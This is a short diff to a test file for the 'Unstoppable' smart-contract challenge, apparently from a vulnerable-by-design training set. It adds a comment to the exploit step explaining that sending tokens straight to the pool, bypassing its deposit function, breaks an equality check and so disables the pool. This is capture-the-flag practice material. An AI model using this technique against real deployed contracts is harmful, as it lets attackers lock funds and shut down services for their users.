@@ -39,6 +39,7 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
+        // send DVT to the pool bypassing depositTokens and break the equality 
         await this.token.transfer(this.pool.address, 10, { from: attacker });
     });
 
